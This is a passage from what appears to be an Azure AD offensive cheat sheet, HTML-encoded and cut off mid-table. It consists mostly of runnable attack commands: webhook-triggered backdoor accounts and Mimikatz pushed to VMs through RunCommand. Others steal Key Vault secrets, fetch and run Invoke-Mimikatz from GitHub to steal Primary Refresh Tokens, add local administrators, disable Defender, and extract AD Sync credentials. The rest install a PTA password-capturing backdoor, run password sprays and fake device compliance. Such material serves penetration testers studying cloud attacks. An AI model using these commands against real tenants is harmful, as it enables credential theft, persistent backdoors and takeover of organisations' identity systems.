group&#xA;az ad signed-in-user list-owned-objects&#xA;&#xA;# If the user is not part of an &#34;Automation&#34; group.&#xA;# Add him to a custom group , e.g: &#34;Automation Admins&#34;&#xA;Add-AzureADGroupMember -ObjectId &amp;lt;OBJID&amp;gt; -RefObjectId &amp;lt;REFOBJID&amp;gt; -Verbose&#xA;&#xA;# Get the role of a user on the Automation account&#xA;# Contributor or higher = Can create and execute Runbooks&#xA;Get-AzRoleAssignment -Scope /subscriptions/&amp;lt;ID&amp;gt;/resourceGroups/&amp;lt;RG-NAME&amp;gt;/providers/Microsoft.Automation/automationAccounts/&amp;lt;AUTOMATION-ACCOUNT&amp;gt;&#xA;&#xA;# List hybrid workers&#xA;Get-AzAutomationHybridWorkerGroup -AutomationAccountName &amp;lt;AUTOMATION-ACCOUNT&amp;gt; -ResourceGroupName &amp;lt;RG-NAME&amp;gt;&#xA;&#xA;# Create a Powershell Runbook&#xA;PS C:\Tools&amp;gt; Import-AzAutomationRunbook -Name &amp;lt;RUNBOOK-NAME&amp;gt; -Path C:\Tools\username.ps1 -AutomationAccountName &amp;lt;AUTOMATION-ACCOUNT&amp;gt; -ResourceGroupName &amp;lt;RG-NAME&amp;gt; -Type PowerShell -Force -Verbose&#xA;&#xA;# Publish the Runbook&#xA;Publish-AzAutomationRunbook -RunbookName &amp;lt;RUNBOOK-NAME&amp;gt; -AutomationAccountName &amp;lt;AUTOMATION-ACCOUNT&amp;gt; -ResourceGroupName &amp;lt;RG-NAME&amp;gt; -Verbose&#xA;&#xA;# Start the Runbook&#xA;Start-AzAutomationRunbook -RunbookName &amp;lt;RUNBOOK-NAME&amp;gt; -RunOn Workergroup1 -AutomationAccountName &amp;lt;AUTOMATION-ACCOUNT&amp;gt; -ResourceGroupName &amp;lt;RG-NAME&amp;gt; -Verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Persistence via Automation accounts&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Create a new Automation Account &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&#34;Create Azure Run As account&#34;: Yes&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Import a new runbook that creates an AzureAD user with Owner permissions for the subscription* &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Sample runbook for this Blog located here – &lt;a href=&#34;https://github.com/NetSPI/MicroBurst&#34;&gt;https://github.com/NetSPI/MicroBurst&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Publish the runbook&lt;/li&gt; &#xA;   &lt;li&gt;Add a webhook to the runbook&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Add the AzureAD module to the Automation account &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Update the Azure Automation Modules&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Assign &#34;User Administrator&#34; and &#34;Subscription Owner&#34; rights to the automation account&lt;/li&gt; &#xA; &lt;li&gt;Eventually lose your access…&lt;/li&gt; &#xA; &lt;li&gt;Trigger the webhook with a post request to create the new user &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;$uri = &#34;https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d&#34;&#xA;$AccountInfo  = @(@{RequestBody=@{Username=&#34;BackdoorUsername&#34;;Password=&#34;BackdoorPassword&#34;}})&#xA;$body = ConvertTo-Json -InputObject $AccountInfo&#xA;$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Virtual Machine RunCommand&lt;/h2&gt; &#xA;&lt;p&gt;Requirements:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;Microsoft.Compute/virtualMachines/runCommand/action&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Get Public IP of VM : query the network interface&#xA;PS AzureAD&amp;gt; Get-AzVM -Name &amp;lt;RESOURCE&amp;gt; -ResourceGroupName &amp;lt;RG-NAME&amp;gt; | select -ExpandProperty NetworkProfile&#xA;PS AzureAD&amp;gt; Get-AzNetworkInterface -Name &amp;lt;RESOURCE368&amp;gt;&#xA;PS AzureAD&amp;gt; Get-AzPublicIpAddress -Name &amp;lt;RESOURCEIP&amp;gt;&#xA;&#xA;# Execute Powershell script on the VM&#xA;PS AzureAD&amp;gt; Invoke-AzVMRunCommand -VMName &amp;lt;RESOURCE&amp;gt; -ResourceGroupName &amp;lt;RG-NAME&amp;gt; -CommandId &#39;RunPowerShellScript&#39; -ScriptPath &#39;C:\Tools\adduser.ps1&#39; -Verbose&#xA;&#xA;# Connect via WinRM&#xA;PS C:\Tools&amp;gt; $password = ConvertTo-SecureString &#39;&amp;lt;PASSWORD&amp;gt;&#39; -AsPlainText -Force&#xA;PS C:\Tools&amp;gt; $creds = New-Object System.Management.Automation.PSCredential(&#39;username&#39;, $Password)&#xA;PS C:\Tools&amp;gt; $sess = New-PSSession -ComputerName &amp;lt;IP&amp;gt; -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)&#xA;PS C:\Tools&amp;gt; Enter-PSSession $sess&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Allow anyone with &#34;Contributor&#34; rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# List available VMs&#xA;PS C:\&amp;gt; Get-AzureRmVM -status | where {$_.PowerState -EQ &#34;VM running&#34;} | select ResourceGroupName,Name&#xA;ResourceGroupName    Name       &#xA;-----------------    ----       &#xA;TESTRESOURCES        Remote-Test&#xA;&#xA;# Execute Powershell script on the VM&#xA;PS C:\&amp;gt; Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Against the whole subscription using MicroBurst.ps1&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Import-module MicroBurst.psm1&#xA;Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;KeyVault Secrets&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# keyvault access token&#xA;curl &#34;$IDENTITY_ENDPOINT?resource=https://vault.azure.net&amp;amp;apiversion=2017-09-01&#34; -H secret:$IDENTITY_HEADER&#xA;curl &#34;$IDENTITY_ENDPOINT?resource=https://management.azure.com&amp;amp;apiversion=2017-09-01&#34; -H secret:$IDENTITY_HEADER&#xA;&#xA;# connect&#xA;PS&amp;gt; $token = &#39;eyJ0..&#39;&#xA;PS&amp;gt; $keyvaulttoken = &#39;eyJ0..&#39;&#xA;PS Az&amp;gt; Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken&#xA;&#xA;# query the vault and the secrets&#xA;PS Az&amp;gt; Get-AzKeyVault&#xA;PS Az&amp;gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault&#xA;PS Az&amp;gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Pass The PRT&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Run mimikatz to obtain the PRT&#xA;PS&amp;gt; iex (New-Object Net.Webclient).downloadstring(&#34;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1&#34;)&#xA;PS&amp;gt; Invoke-Mimikatz -Command &#39;&#34;privilege::debug&#34; &#34;sekurlsa::cloudap&#34;&#39;&#xA;&#xA;# Copy the PRT and KeyValue&#xA;Mimikatz&amp;gt; privilege::debug&#xA;Mimikatz&amp;gt; token::elevate&#xA;Mimikatz&amp;gt; dpapi::cloudapkd /keyvalue:&amp;lt;KeyValue&amp;gt; /unprotect&#xA;&#xA;# Copy the Context, ClearKey and DerivedKey&#xA;Mimikatz&amp;gt; dpapi::cloudapkd /context:&amp;lt;Context&amp;gt; /derivedkey:&amp;lt;DerivedKey&amp;gt; /Prt:&amp;lt;PRT&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Generate a JWT&#xA;PS&amp;gt; Import-Module C:\Tools\AADInternals\AADInternals.psd1&#xA;PS AADInternals&amp;gt; $PRT_OF_USER = &#39;...&#39;&#xA;PS AADInternals&amp;gt; while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += &#34;=&#34;}&#xA;PS AADInternals&amp;gt; $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))&#xA;PS AADInternals&amp;gt; $ClearKey = &#34;XXYYZZ...&#34;&#xA;PS AADInternals&amp;gt; $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace &#39;..&#39;, &#39;0x$&amp;amp;,&#39; -split &#39;,&#39; -ne &#39;&#39;))&#xA;PS AADInternals&amp;gt; New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce&#xA;eyJ0eXAiOiJKV1QiL...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;code&gt;&amp;lt;Signed JWT&amp;gt;&lt;/code&gt; (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for &lt;a href=&#34;https://login.microsoftonline.com/login.srf&#34;&gt;https://login.microsoftonline.com/login.srf&lt;/a&gt;.&lt;br&gt; Edit the Chrome cookie (F12) -&amp;gt; Application -&amp;gt; Cookies with the values:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Name: x-ms-RefreshTokenCredential&#xA;Value: &amp;lt;Signed JWT&amp;gt;&#xA;HttpOnly: √&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; Mark the cookie with the flags &lt;code&gt;HTTPOnly&lt;/code&gt; and &lt;code&gt;Secure&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Pass The Certificate&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;Copy-Item -ToSession $jumpvm -Path C:\Tools\PrtToCertmaster.zip -Destination C:\Users\Username\Documents\username –Verbose&#xA;Expand-Archive -Path C:\Users\Username\Documents\username\PrtToCert-master.zip -DestinationPath C:\Users\Username\Documents\username\PrtToCert&#xA;&#xA;# Require the PRT, TenantID, Context and DerivedKey&#xA;&amp;amp; &#39;C:\Program Files\Python39\python.exe&#39; C:\Users\Username\Documents\username\PrtToCert\RequestCert.py --tenantId &amp;lt;TENANT-ID&amp;gt; --prt &amp;lt;PRT&amp;gt; --userName &amp;lt;Username&amp;gt;@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com --hexCtx &amp;lt;HEX-CONTEXT&amp;gt; --hexDerivedKey &amp;lt;HEX-DERIVED-KEY&amp;gt;&#xA;# PFX saved with the name &amp;lt;Username&amp;gt;@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com.pfx and password AzureADCert&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/morRubin/AzureADJoinedMachinePTC&#34;&gt;https://github.com/morRubin/AzureADJoinedMachinePTC&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ps1&#34;&gt;Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP&#xA;Main.py --usercert &#34;admin.pfx&#34; --certpass password --remoteip 10.10.10.10&#xA;&#xA;python Main.py --usercert C:\Users\Username\Documents\username\&amp;lt;USERNAME&amp;gt;@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com.pfx --&#xA;certpass AzureADCert --remoteip 10.10.10.10 --command &#34;cmd.exe /c net user username Password@123 /add /Y &amp;amp;&amp;amp; net localgroup administrators username /add&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Intunes Administration&lt;/h2&gt; &#xA;&lt;p&gt;Requirements:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Global Administrator&lt;/strong&gt; or &lt;strong&gt;Intune Administrator&lt;/strong&gt; Privilege : &lt;code&gt;Get-AzureADGroup -Filter &#34;DisplayName eq &#39;Intune Administrators&#39;&#34;&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Login into &lt;a href=&#34;https://endpoint.microsoft.com/#home&#34;&gt;https://endpoint.microsoft.com/#home&lt;/a&gt; or use Pass-The-PRT&lt;/li&gt; &#xA; &lt;li&gt;Go to &lt;strong&gt;Devices&lt;/strong&gt; -&amp;gt; &lt;strong&gt;All Devices&lt;/strong&gt; to check devices enrolled to Intune&lt;/li&gt; &#xA; &lt;li&gt;Go to &lt;strong&gt;Scripts&lt;/strong&gt; and click on &lt;strong&gt;Add&lt;/strong&gt; for Windows 10.&lt;/li&gt; &#xA; &lt;li&gt;Add a &lt;strong&gt;Powershell script&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Specify &lt;strong&gt;Add all users&lt;/strong&gt; and &lt;strong&gt;Add all devices&lt;/strong&gt; in the &lt;strong&gt;Assignments&lt;/strong&gt; page.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; It will take up to one hour before you script is executed !&lt;/p&gt; &#xA;&lt;h2&gt;Dynamic Group Membership&lt;/h2&gt; &#xA;&lt;p&gt;Get groups that allow Dynamic membership: &lt;code&gt;Get-AzureADMSGroup | ?{$_.GroupTypes -eq &#39;DynamicMembership&#39;}&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Rule example : &lt;code&gt;(user.otherMails -any (_ -contains &#34;vendor&#34;)) -and (user.userType -eq &#34;guest&#34;)&lt;/code&gt;&lt;br&gt; Rule description: Any Guest user whose secondary email contains the string &#39;vendor&#39; will be added to the group&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Open user&#39;s profile, click on &lt;strong&gt;Manage&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Click on &lt;strong&gt;Resend&lt;/strong&gt; invite and to get an invitation URL&lt;/li&gt; &#xA; &lt;li&gt;Set the secondary email &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS&amp;gt; Set-AzureADUser -ObjectId &amp;lt;OBJECT-ID&amp;gt; -OtherMails &amp;lt;Username&amp;gt;@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com -Verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Administrative Unit&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Administrative Unit can reset password of another user&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS AzureAD&amp;gt; Get-AzureADMSAdministrativeUnit -Id &amp;lt;ID&amp;gt;&#xA;PS AzureAD&amp;gt; Get-AzureADMSAdministrativeUnitMember -Id &amp;lt;ID&amp;gt;&#xA;PS AzureAD&amp;gt; Get-AzureADMSScopedRoleMembership -Id &amp;lt;ID&amp;gt; | fl&#xA;PS AzureAD&amp;gt; Get-AzureADDirectoryRole -ObjectId &amp;lt;RoleId&amp;gt;&#xA;PS AzureAD&amp;gt; Get-AzureADUser -ObjectId &amp;lt;RoleMemberInfo.Id&amp;gt; | fl &#xA;PS C:\Tools&amp;gt; $password = &#34;Password&#34; | ConvertToSecureString -AsPlainText -Force&#xA;PS C:\Tools&amp;gt; (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq &#34;&amp;lt;Username&amp;gt;@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com&#34;}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Deployment Template&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS Az&amp;gt; Get-AzResourceGroup&#xA;PS Az&amp;gt; Get-AzResourceGroupDeployment -ResourceGroupName SAP&#xA;&#xA;# Export&#xA;PS Az&amp;gt; Save-AzResourceGroupDeploymentTemplate -ResourceGroupName &amp;lt;RESOURCE GROUP&amp;gt; -DeploymentName &amp;lt;DEPLOYMENT NAME&amp;gt;&#xA;cat &amp;lt;DEPLOYMENT NAME&amp;gt;.json # search for hardcoded password&#xA;cat &amp;lt;PATH TO .json FILE&amp;gt; | Select-String password&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Application Proxy&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Enumerate application that have Proxy&#xA;PS C:\Tools&amp;gt; Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}&#xA;PS C:\Tools&amp;gt; Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq &#34;Finance Management System&#34;}&#xA;PS C:\Tools&amp;gt; . C:\Tools\GetApplicationProxyAssignedUsersAndGroups.ps1&#xA;PS C:\Tools&amp;gt; Get-ApplicationProxyAssignedUsersAndGroups -ObjectId &amp;lt;OBJECT-ID&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Conditional Access&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Bypassing conditional access by copying User-Agent (Chrome Dev Tool &amp;gt; Select iPad Pro, etc)&lt;/li&gt; &#xA; &lt;li&gt;Bypassing conditional access by faking device compliance &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# AAD Internals - Making your device compliant&#xA;# Get an access token for AAD join and save to cache&#xA;Get-AADIntAccessTokenForAADJoin -SaveToCache&#xA;# Join the device to Azure AD&#xA;Join-AADIntDeviceToAzureAD -DeviceName &#34;SixByFour&#34; -DeviceType &#34;Commodore&#34; -OSVersion &#34;C64&#34;&#xA;# Marking device compliant - option 1: Registering device to Intune&#xA;# Get an access token for Intune MDM and save to cache (prompts for credentials)&#xA;Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache &#xA;# Join the device to Intune&#xA;Join-AADIntDeviceToIntune -DeviceName &#34;SixByFour&#34;&#xA;# Start the call back&#xA;Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName &#34;SixByFour&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Azure AD&lt;/h2&gt; &#xA;&lt;p&gt;With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Authenticate to your webmail portal (i.e. &lt;a href=&#34;https://webmail.domain.com/&#34;&gt;https://webmail.domain.com/&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Change your browser URL to: &lt;a href=&#34;https://azure.microsoft.com/&#34;&gt;https://azure.microsoft.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Pick the account from the active sessions&lt;/li&gt; &#xA; &lt;li&gt;Select Azure Active Directory and enjoy!&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Azure AD vs Active Directory&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Active Directory&lt;/th&gt; &#xA;   &lt;th&gt;Azure AD&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;LDAP&lt;/td&gt; &#xA;   &lt;td&gt;REST API&#39;S&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;NTLM/Kerberos&lt;/td&gt; &#xA;   &lt;td&gt;OAuth/SAML/OpenID&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Structured directory (OU tree)&lt;/td&gt; &#xA;   &lt;td&gt;Flat structure&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;GPO&lt;/td&gt; &#xA;   &lt;td&gt;No GPO&#39;s&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Super fine-tuned access controls&lt;/td&gt; &#xA;   &lt;td&gt;Predefined roles&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Domain/forest&lt;/td&gt; &#xA;   &lt;td&gt;Tenant&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Trusts&lt;/td&gt; &#xA;   &lt;td&gt;Guests&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Password Hash Syncronization (PHS)&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Passwords from on-premise AD are sent to the cloud&lt;/li&gt; &#xA;   &lt;li&gt;Use replication via a service account created by AD Connect&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Pass Through Authentication (PTA)&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Connect Windows Server AD to Azure AD using Federation Server (ADFS)&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Dir-Sync : Handled by on-premise Windows Server AD, sync username/password&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Azure AD Joined : &lt;a href=&#34;https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;amp;name=large&#34;&gt;https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;amp;name=large&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Workplace Joined : &lt;a href=&#34;https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;amp;name=large&#34;&gt;https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;amp;name=large&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Hybrid Joined : &lt;a href=&#34;https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;amp;name=large&#34;&gt;https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;amp;name=large&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Workplace joined on AADJ or Hybrid : &lt;a href=&#34;https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;amp;name=large&#34;&gt;https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;amp;name=large&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Password Spray&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Default lockout policy of 10 failed attempts, locking out an account for 60 seconds&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;git clone https://github.com/dafthack/MSOLSpray&#xA;Import-Module .\MSOLSpray.ps1&#xA;Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020&#xA;Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!&#xA;&#xA;# UserList  - UserList file filled with usernames one-per-line in the format &#34;user@domain.com&#34;&#xA;# Password  - A single password that will be used to perform the password spray.&#xA;# OutFile   - A file to output valid results to.&#xA;# Force     - Forces the spray to continue and not stop when multiple account lockouts are detected.&#xA;# URL       - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Convert GUID to SID&lt;/h3&gt; &#xA;&lt;p&gt;The user&#39;s AAD id is translated to SID by concatenating &lt;code&gt;&#34;S-1–12–1-&#34;&lt;/code&gt; to the decimal representation of each section of the AAD Id.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]&#xA;SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For example, the representation of &lt;code&gt;6aa89ecb-1f8f-4d92–810d-b0dce30b6c82&lt;/code&gt; is &lt;code&gt;S-1–12–1–1789435595–1301421967–3702525313–2188119011&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Azure AD Connect&lt;/h2&gt; &#xA;&lt;p&gt;Check if Azure AD Connect is installed : &lt;code&gt;Get-ADSyncConnector&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;For &lt;strong&gt;PHS&lt;/strong&gt;, we can extract the credentials&lt;/li&gt; &#xA; &lt;li&gt;For &lt;strong&gt;PTA&lt;/strong&gt;, we can install the agent&lt;/li&gt; &#xA; &lt;li&gt;For &lt;strong&gt;Federation&lt;/strong&gt;, we can extract the certificate from ADFS server using DA&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS &amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true&#xA;PS &amp;gt; Copy-Item -ToSession $adcnct -Path C:\Tools\AADInternals.0.4.5.zip -Destination C:\Users\Administrator\Documents&#xA;PS &amp;gt; Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\Administrator\Documents\AADInternals&#xA;PS &amp;gt; Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1&#xA;PS &amp;gt; Get-AADIntSyncCredentials&#xA;&#xA;# Get Token for SYNC account and reset on-prem admin password&#xA;PS &amp;gt; $passwd = ConvertToSecureString &#39;password&#39; -AsPlainText -Force&#xA;PS &amp;gt; $creds = New-Object System.Management.Automation.PSCredential (&#34;&amp;lt;Username&amp;gt;@&amp;lt;TenantName&amp;gt;.onmicrosoft.com&#34;, $passwd)&#xA;PS &amp;gt; GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache&#xA;PS &amp;gt; Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId&#xA;PS &amp;gt; Set-AADIntUserPassword -SourceAnchor &#34;&amp;lt;IMMUTABLE-ID&amp;gt;&#34; -Password &#34;Password&#34; -Verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Check if PTA is installed : &lt;code&gt;Get-Command -Module PassthroughAuthPSModule&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Install a PTA Backdoor &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS AADInternals&amp;gt; Install-AADIntPTASpy&#xA;PS AADInternals&amp;gt; Get-AADIntPTASpyLog -DecodePasswords&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Azure AD Connect - Password extraction&lt;/h3&gt; &#xA;&lt;p&gt;Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Tool&lt;/th&gt; &#xA;   &lt;th&gt;Requires code execution on target&lt;/th&gt; &#xA;   